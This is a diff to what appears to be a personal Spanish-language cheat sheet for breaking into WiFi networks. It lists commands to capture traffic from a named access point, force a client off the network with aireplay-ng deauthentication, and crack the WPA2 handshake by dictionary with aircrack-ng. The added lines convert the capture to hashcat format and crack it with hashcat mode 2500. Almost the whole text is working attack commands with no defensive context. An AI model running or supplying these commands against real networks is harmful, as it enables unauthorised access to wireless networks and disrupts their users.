@@ -31,10 +31,16 @@ sudo airodump-ng wlan0
 sudo airodump-ng -c 4 --bssid 04:FE:8D:76:5B:88 -w wpa2 wlan0   
 
 //Deautenticación
-sudo aireplay-ng -0 10 -a $bssid -c $cliente wlan0
+sudo aireplay-ng -0 10 -a $bssid -c $cliente wlan0    -- con esto ver que obtenga el handshake en la captura
 
 //Crackeo de handshake
 sudo aircrack-ng -0 -w Documents/crackstation.txt wpa2-01.cap
+
+**** si quiero hacer mas rapido el crackeo debo convertir la capturas a formato hashcat
+aircrack-ng -j $captura $captura_hashcat   -- crear .hccapx
+hashcat -m 2500 $captura_hashcat $diccionario -- crackear con este comando final
+
+
 
 
 ###### WEP con clientes OpenSystem ############## 
